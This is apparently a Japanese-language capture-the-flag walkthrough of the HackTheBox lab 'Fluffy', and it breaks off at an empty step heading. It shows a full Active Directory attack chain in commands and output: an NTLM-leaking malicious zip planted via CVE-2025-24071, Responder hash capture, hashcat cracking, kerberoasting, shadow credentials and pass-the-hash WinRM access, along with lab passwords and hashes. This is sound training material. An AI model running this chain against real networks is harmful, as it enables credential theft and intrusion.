https://app.hackthebox.com/machines/662

## STEP 1
```sh
└─$ rustscan -a 10.129.180.164 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.180.164:53
Open 10.129.180.164:88
Open 10.129.180.164:139
Open 10.129.180.164:389
Open 10.129.180.164:445
Open 10.129.180.164:464
Open 10.129.180.164:593
Open 10.129.180.164:636
Open 10.129.180.164:3269
Open 10.129.180.164:3268
Open 10.129.180.164:5985
Open 10.129.180.164:9389
Open 10.129.180.164:49667
Open 10.129.180.164:49689
Open 10.129.180.164:49690
Open 10.129.180.164:49698
Open 10.129.180.164:49709
Open 10.129.180.164:49722
10.129.180.164 -> [53,88,139,389,445,464,593,636,3269,3268,5985,9389,49667,49689,49690,49698,49709,49722]
```


## STEP 2
判明しているクレデンシャルでsmb列挙  
itフォルダがreadおよびwrite権限あり
```sh
└─$ netexec smb 10.129.180.164 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
SMB         10.129.180.164  445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         10.129.180.164  445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.180.164  445    DC01             [*] Enumerated shares
SMB         10.129.180.164  445    DC01             Share           Permissions     Remark
SMB         10.129.180.164  445    DC01             -----           -----------     ------
SMB         10.129.180.164  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.180.164  445    DC01             C$                              Default share
SMB         10.129.180.164  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.180.164  445    DC01             IT              READ,WRITE      
SMB         10.129.180.164  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.180.164  445    DC01             SYSVOL          READ            Logon server share
```
itフォルダ内にpdf発見・ダウンロード
```sh
└─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' //10.129.180.164/IT  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Oct 26 11:47:26 2025
  ..                                  D        0  Sun Oct 26 11:47:26 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025

                5842943 blocks of size 4096. 1589754 blocks available

smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (86.7 KiloBytes/sec) (average 86.7 KiloBytes/sec)
```
pdfはセキュリティアップデートに関する内容であったが、この中で一つ面白い脆弱性を発見  
2025-24071はzipファイルを解凍後、展開されたlibrary-msファイル内のsmbパスに接続・認証を求める動作が発生する  
詳細は[こちら](https://iototsecnews.jp/2025/05/29/windows-11-file-explorer-vulnerability-enables-ntlm-hash-theft/)  
ということで、smbパスに攻撃者のresponderを指定すればあるユーザのntハッシュを取得できるかも  
運がいいことにitフォルダに対するwrite権限があったので、その中に脆弱性を悪用するzipを投下する
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_01.png">  
exploitdbにPoCがあったのでダウンロード
```sh
└─$ searchsploit -m 52310                                                  
  Exploit: Windows File Explorer Windows 11 (23H2) - NTLM Hash Disclosure
      URL: https://www.exploit-db.com/exploits/52310
     Path: /usr/share/exploitdb/exploits/windows/remote/52310.py
    Codes: CVE-2025-24071
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/52310.py
```
PoC実行、zipファイル作成・転送
```sh
└─$ python3.13 52310.py -i 10.10.16.28   
[*] Generating malicious .library-ms file...
[+] Created ZIP: output/malicious.zip
[-] Removed intermediate .library-ms file
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.

└─$ smbclient -U 'fluffy.htb/j.fleischman%J0elTHEM4n1990!' -c 'put output/malicious.zip malicious.zip' //10.129.180.164/IT 
putting file output/malicious.zip as \malicious.zip (0.4 kb/s) (average 0.4 kb/s)
```
数十秒後、p.agilaのntlmv2を取得
```sh
└─$ sudo responder -I tun0 -v                  
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.28]
    Responder IPv6             [dead:beef:4::101a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-FU999S0IJM8]
    Responder Domain Name      [7NWM.LOCAL]
    Responder DCE-RPC Port     [46928]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                            

[SMB] NTLMv2-SSP Client   : 10.129.180.164
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:21ff35a920c2d5e2:D2040ADA5724EE166D8A14D051BB1390:010100000000000000A1C8F97746DC01EF96C7639761DF09000000000200080037004E0057004D0001001E00570049004E002D00460055003900390039005300300049004A004D00380004003400570049004E002D00460055003900390039005300300049004A004D0038002E0037004E0057004D002E004C004F00430041004C000300140037004E0057004D002E004C004F00430041004C000500140037004E0057004D002E004C004F00430041004C000700080000A1C8F97746DC01060004000200000008003000300000000000000001000000002000008298BC357424DFB2237001C7CBC36699C60D28F91D8CABE3BE4E947B672AF38D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320038000000000000000000
```
ntlmv2をクラック成功  
p.agilaのパスワードは、prometheusx-303
```sh
└─$ name-that-hash -f p.agila.txt --no-banner 

p.agila::FLUFFY:21ff35a920c2d5e2:D2040ADA5724EE166D8A14D051BB1390:010100000000000000A1C8F97746DC01EF96C7639761DF09000000000200080037004E0057004D0001001E00570049004E002
D00460055003900390039005300300049004A004D00380004003400570049004E002D00460055003900390039005300300049004A004D0038002E0037004E0057004D002E004C004F00430041004C0003001400
37004E0057004D002E004C004F00430041004C000500140037004E0057004D002E004C004F00430041004C000700080000A1C8F97746DC010600040002000000080030003000000000000000010000000020000
08298BC357424DFB2237001C7CBC36699C60D28F91D8CABE3BE4E947B672AF38D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E
00320038000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2

└─$ hashcat -a 0 -m 5600 p.agila.txt /usr/share/wordlists/rockyou.txt --quiet 
P.AGILA::FLUFFY:21ff35a920c2d5e2:d2040ada5724ee166d8a14d051bb1390:010100000000000000a1c8f97746dc01ef96c7639761df09000000000200080037004e0057004d0001001e00570049004e002d00460055003900390039005300300049004a004d00380004003400570049004e002d00460055003900390039005300300049004a004d0038002e0037004e0057004d002e004c004f00430041004c000300140037004e0057004d002e004c004f00430041004c000500140037004e0057004d002e004c004f00430041004c000700080000a1c8f97746dc01060004000200000008003000300000000000000001000000002000008298bc357424dfb2237001c7cbc36699c60d28f91d8cabe3be4e947b672af38d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320038000000000000000000:prometheusx-303
```
step1で5985番ポートのオープンを確認したが、ユーザwirm serviceのみがwinrmログインできるっぽい
```sh
└─$ netexec ldap 10.129.180.164 -u p.agila -p 'prometheusx-303' --groups 'Remote Management Users'
LDAP        10.129.180.164  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.129.180.164  389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
LDAP        10.129.180.164  389    DC01             winrm service
```
ユーザwirm serviceはspnが設定されていたためkerberoast経由でtgsは取得できたが、rockyou.txtではクラックできなかった
```sh
└─$ netexec ldap 10.129.180.164 -u j.fleischman -p 'J0elTHEM4n1990!' --kdcHost 10.129.180.164 --kerberoasting kerberoas.txt
LDAP        10.129.180.164  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.129.180.164  389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
LDAP        10.129.180.164  389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.129.180.164  389    DC01             [*] Total of records returned 3
LDAP        10.129.180.164  389    DC01             [*] sAMAccountName: ca_svc, memberOf: ['CN=Service Accounts,CN=Users,DC=fluffy,DC=htb', 'CN=Cert Publishers,CN=Users,DC=fluffy,DC=htb'], pwdLastSet: 2025-04-17 16:07:50.136701, lastLogon: 2025-05-21 22:21:15.969274
LDAP        10.129.180.164  389    DC01             $krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb\ca_svc*$e1af32e4b4fd919a7a7578f96b522c0f$c452960f465be8887e4f4e01201f14664d8d96f394fb6bf74720ad4cc0375cff5b138157aec66bb344dcfeefa43ac2500b07bbf5fbe220806a379326437bc3d2ff8f560a6918dfd58430efd4927cb4a930a8fba10622819d781005d1d7f5c27a0cc6cb20211278f571a0f09f146b7db3cc1488c648ad4c349b5707d7525ab45e108462a188a0b4463b5662ce1e3ec688f9dfc3731eb7f0ec57e5c700c435fbaa892cf4a7cc5af6fe6094a0a672851b50690c60287e92ee76bcfc59e5ee93c35a2eb40ac1c381b5c05eb530358e9e204c4a909f921be49618016e0915df6b83e09744b571a0f8ff8a582c061c0b41442e1770c2431397414a272b60b6b6b0b07dd887984127cfd33a1d189ef21f07d7fdb23294987e3374bb303eda488a3ad020c9c516b73d0798ce4f49e51c46b8018e1be258ac8f7978998bb58b7580e5ec4e8d8bd4c33da6d494879e9a9a26af41e648482380243180de3d258a2a5e4bd941c892afaf41f4013b48a2a74ce86539dbc5c43bee57f54ce5744af44c3bd6ac13dcea7a0ce5cfe42caa68903524088d4cdb023d3bd990c635e66436a54b42f29423878435f9000ed2cf111f857921be22f4201e183c35b265f491001b9008c655eff18f20c0d10b346f008917ee737cd25187ec4e2f0304d900e5e7425c370d2ad9d6f90ab8159c16cc34c06700009fc5d1bd8af9ae8ec8da98b2c0fa3da35aab820ef721e08934af4377a15d35203b408bc03a76c3cfe43bdc5796702018d5f2d6af2714ff625c68d5dc853518e14cac0563eaaffbeef20532643bc584d20ec511b1232b48af0db5c7d45d4f48a457ce5f90b87442646accc972e70a99750bc66ded2e516419edd6bc34ad2d7af9fc67cc131788483a913e9a1182e5118fbb1f43f30d98187b879c585344d996fa9bf7fcea5763ed871be6ef079a40c5eb36ff863668618d4b2b854b9e79e4b4c147eb84a519385144b72a2a140ea466a317d6ec24819b8477c7cdbd685c91f3f75c7635bc18e22af547e84b4abf3ffb627971d8dc100a4eb8766cc628b10feb0bc94a3f4152f1b47fb3c1ea1a124d3d3303c543fb68e697a2e7437518086d9f610c3346aec391414f7c1c0c2ff4722ae9db245c81cc22cfa9267e48adadff1f0b94b3c5d505b5800fdcff8e8d0dfaa84354daf51569f19f0fb68d84316fa4ad697882d6fbcf3018d36c4ef8a9d70f4aeb79f89147973f276dbf5cf6859bb8a962a6b9bd92846f1c664c355649ac131451c4781c6f32423556ebc625da33a4fadfbbed19a48f63529be10ee904e3d7f1e7a6448567c05082b4ce55721276c4259e5990e3081806f4bf976c1fc7691d6cdbe93943b164902e5a43d700b51a1f2ce78bc63a1e476dcc8200cd150778ece8553405b3855e769126464b42f41e0a09c3469ab9044f743cbba44fe28f936630acf89cf8143dbd5f198a5e829a0d81dad336f6245f3323aaf336ea91e1bd6261234597cecdc950c3cb776a4d26697fcb59b71cc2f78144d86d535ce7c3fb043165cb4413107ee969d387             
LDAP        10.129.180.164  389    DC01             [*] sAMAccountName: ldap_svc, memberOf: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb, pwdLastSet: 2025-04-17 16:17:00.599545, lastLogon: <never>
LDAP        10.129.180.164  389    DC01             $krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb\ldap_svc*$d7c5d0eb4a547b79fde85f0dc4dd0ef4$4eddd277f78197b9070a955c5a4e11e6ec7900435379a14414ca12ae3756b8d4743a7adc1ddfad56f221db216b23f45e0277ba16a61a6889a2c86c6a9cb1c186fec4701c39a0e7ba12e1ef25b7a519fdf26407c6a4910aa639320827bee3c68562e52f2f12bbd45f8a161c482103e9b04f0e064e6b40ec1974f07066beffcf2c71da71908398fa3915023bb84cd643c801b0eecfeb5b66061ad21e9f186f5109ca9cb15dddea7eceae1eb4026638199d640c08b6b460168321bf8caf27d45616575088c607a9ea87a26d2363a75b0782be6e453a122ff55cef7e178b3c95b7927b5b702f57e77f720c1e63149d5082785fa7de426d7bac930ffbbaccd5e24eaa26432d3cb2d6a5e670d7e828edd8bb69f0607162069fd75bdbfa6a5e5947003fd6a109bda4d3ce2260a7f22fa1a042428732aa1e14fd51a732b4af7958df5ac2642d92daca61bac2754ccb98509fb172e9065be1c7fe572db0b48a6062fdf258372a2e83384cf52da8ec124f26af9c009afa982a9fe87c6e419d4bb457aa3aba0ceaceb57e93aa274f2b79a9e6666791abdfbcf3cb9ab29a42a9258b2b3047f14a71b57ea723b7bff9b283a9437ade4d9c5262e3309395fc1f9d8f5ba28c639eb3f7d31aae585b765984a7dde1706ec0e013a9772ce254c320ac07a24a121105120b1c0de00bd3702419287cc421b796c66749eb7b937e8128e513a82cd4d1538514e17b6b9cbf7c9e0d6c78c7dbde87c99ce47ab4dd76a5a557645ace72867b3ca50f9428cd2c1f1f200e1517ea3044216b09d7933cbbaf85b354c3fd25d4a9a395bcb2112286aa4586d29c22e9381b56e49817da97b97721cb3a8f461d8aa63f80cc40a96aa28f649b6fb1c097011209e6aba552e1e775cea58f9a861c296b24ecb7e1801e90ac641a281bf0746289b8deb1735b2c246ac8be03df7d4d75c5af0ba5a950a52ea696767aac6edf4bc0dc6d637ffca8319f51e7ee8a80b1d1ce137bce4ba1802dc590b8d298d72d67189773d3191c03d781116232e0af17d144bbf831d4bbda36adc9f8275911a40b3ac6c24b0048a13f026649959e2b4e471ff12223f5ba7203dbcbcacd5de35e2599bbabca3420bf4d0fc5c3f3578f2e04985f7261652be55a3df87f38ed124c17c7cb63c8696c6735f31c26779404acd2532d6cbefe0ebc7d94a434295365a0f1f1edf8c74b77e1ea552fde6690fb96ce83938786745de6b7a53dd8d4f11fb0be2627ebc140fe3fb81c4f9a4cfd50c31f94a62ca55f8265e86131f762811ca5f8caf64725ed562b21f5cedf3eedd131e9cd3692038d37bb12ed9497ea9c42a787c5a06820b2fd6368f474ae542a1f6c38f19bcb2a8a0178afced51d1343ebd3422f4d5cc3ac7a0a7ad2861f47f6ad4773c6ebe6bd8800c30e9d5d6bdb79bd2089511a2a551aa2ec4424962a6fb981402693caccb827c29fa718df9c9b4e3c8e923ec944c6d49b5751f92d16d874f01f8ac68b184ee0a558e10154578e47afa118424e3fd277c266622474b33d84029ecc50eef4ec2ba07382         
LDAP        10.129.180.164  389    DC01             [*] sAMAccountName: winrm_svc, memberOf: ['CN=Service Accounts,CN=Users,DC=fluffy,DC=htb', 'CN=Remote Management Users,CN=Builtin,DC=fluffy,DC=htb'], pwdLastSet: 2025-05-18 00:51:16.786913, lastLogon: 2025-05-19 15:13:22.188468
LDAP        10.129.180.164  389    DC01             $krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb\winrm_svc*$7bb8dda24f25b66780e4a906283637dd$9e55c648d75d5b8ade8306587a7f539baf03e4868e24a448a5c3ad408abe97fcf7a47f566101261a48d9e3cfb3b852afd15e0d00405195c9e7ff8e8b0dbfcbb84a60a55cb4dec708c6dfd9a61060a41fad91968afda5626d2b3c87e09d29edd2319999d171b10af300189f44182bb98c9827661f9f9dc55b1c7b12f1560ec2bf04de6f125c3c8ed2bf394a165571507a28cee61b93a4a548e21388de74a270d4f49c51753440fb398951c3293e65e2b25137e0c283628a6e2a003d2eca9afaf14572c6f0b8df85dd5592ed1d7fefaddc0fb0b8b563249443fbce590429582557533190b8e68af96db2367d4747ba928ad7e111a512c40daec943abb44305f7823b73ba421ab20e9f76442cee327dc0a3b5552c5718fa388267230fd470d2bba8d540141994abfae4cd21d432f18b877f5daaf2e37376f586043191e9c4ba617a830df8c094fcb5efc7190bc011da319e31b65562d731a550703d0a69f5b083921e6f7049af925450967f51943d0346a22a24723546a6fcbe39fed2b4591e52af08a0b422ee3c55e1bc3f055111db2454ed570fc4c67bb6dd6057a27c8a705b13dbcdc3e28daf0a719aec0603ecf39d9d004dfb10472c471d1c2112eb72440ddab6228b780674eda94e2e6bce7cf14e92ae87415c8050b568850fe72063ff1068d91c4c6d41fee91fce84e59d0ebbd9dcc2320e4170bd6ba8443707f49cee8c0163c1026a89e3b8edd7a4c660a09464ead6652be3fc25aea9ed6d2c9a567431a5ed81ec005622fe8d84b8c58104fc166aa513af43d33ce2497e6941dfea3c25c99865ccc5b4ae5381421eb90165a2d063ac17e1d341393ff6f44d02fd3cab59bc21f0d9d5bfbe3da025db52ae209e1cfa9beb46b83d2a5d1bbfe4fe7ec87a42cf4a468d3b7ce1f3ea7834fcd2756ed3f75e59f1f2769e35de13b73ef4131d92a35b0e1ee0b74b5ff79b66f61f0096ea43d201a682e6bb75a8dfeb9d6addb0515825a27968099b482fd45b17aa31e30fba01355476690b5127051ea1ab3a67de2e15a4f4d3d7bf97555e79ed06aa1f4898997e5360388b031f913cb73a88b7b54b2e5f64bfefe0ad4895e0fcd8840873c6e43d8f7e4f72e47f78a1674035be5b6c6e57bc97d67832cea1949dd3ef53d2b6d77d73f4d68cce2aa60e35c61ce1ef8024e04b6fd6c38f0a398072a5c944f434ba2263aee68503e21a8f8640433a91bde71d6382393bba2d2edcee75a50620c4241af901c3ba62733d09b9c194b371a6bac480ca49a52dc831e36fdd1ce7d5aac6581da0e0c0721c77627b1507cb0c2373efcf33cd511bc4ea63d93735b2eefebfba0f285f3675789f9e4729626a92984a1e10896bfc365d8a0dafeb6f9f1314244a0df5710ce6fd2f76fe8a2a3745d404b6f36119b8f9bcadcda5630a4d393571ad1fc6266cae500c5109f9cdd7f7dcca4419994a4bcc2d066e3e5d352468b67d93d0ea0b3df86bbaba1728df8871fbec8624c1abed4fb1d52d4007156fad9ae326d25e92ffe1690e5c00608b3cc83c78e283618533af
```


## STEP 3
bloodhound実行
```sh
└─$ netexec ldap 10.129.180.164 --dns-server 10.129.180.164 -u p.agila -p 'prometheusx-303' --bloodhound --collection All
LDAP        10.129.180.164  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.129.180.164  389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
LDAP        10.129.180.164  389    DC01             Resolved collection methods: dcom, container, rdp, objectprops, acl, localadmin, group, psremote, session, trusts
LDAP        10.129.180.164  389    DC01             Done in 01M 02S
LDAP        10.129.180.164  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.180.164_2025-10-26_134930_bloodhound.zip
```
winrm_svcにshadowcredentialsを追加できるパスを発見  
shadowcredentialsのわかりやすい記事は[こちら](https://eladshamir.com/2021/06/21/Shadow-Credentials.html)  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_02.png">  
ちなみにshadowcredentialsを悪用するために必要なpkinitが構成されていることを確認
```sh
└─$ netexec ldap 10.129.250.233 -u 'p.agila' -p 'prometheusx-303' -M adcs 
LDAP        10.129.250.233  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.129.250.233  389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
ADCS        10.129.250.233  389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.250.233  389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
ADCS        10.129.250.233  389    DC01             Found CN: fluffy-DC01-CA
```
genericall権限を使用して、service accountsグループに加入
```sh
└─$ impacket-net 'fluffy.htb/p.agila:prometheusx-303@10.129.180.164' group -name 'service accounts' -join p.agila
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Adding user account 'p.agila' to group 'service accounts'
[+] User account added to service accounts succesfully!

└─$ impacket-net 'fluffy.htb/p.agila:prometheusx-303@10.129.180.164' group -name 'service accounts'              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

  1. ca_svc
  2. ldap_svc
  3. p.agila
  4. winrm_svc
```
```sh
└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc add
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: FLUFFY.HTB
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'cb4bca07df824ab2b9fcdcc8d9637716'
[*] Adding Key Credential with device ID 'cb4bca07df824ab2b9fcdcc8d9637716' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'cb4bca07df824ab2b9fcdcc8d9637716' to the Key Credentials for 'winrm_svc'
[*] Saving certificate and private key to 'winrm_svc.pfx'
[*] Saved certificate and private key to 'winrm_svc.pfx'
 
└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc list
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: FLUFFY.HTB
[*] Targeting user 'winrm_svc'
[*] Listing Key Credentials for 'winrm_svc'
[*] DeviceID: cb4bca07df824ab2b9fcdcc8d9637716 | Creation Time (UTC): 2025-10-27 00:29:31
```



genericwrite権限を使用してshadowcredentialswを追加し、tgt取得
ここでntハッシュも取得しているが
```sh
└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.250.233 -account winrm_svc auto
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: FLUFFY.HTB
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '84ac41712a68427a9a2621e2efbb7128'
[*] Adding Key Credential with device ID '84ac41712a68427a9a2621e2efbb7128' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '84ac41712a68427a9a2621e2efbb7128' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```
```sh
└─$ evil-winrm -i 10.129.250.233 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cat ../desktop/user.txt
a599d11e8afd3ae88a721964b11b7671
```


## STEP 3
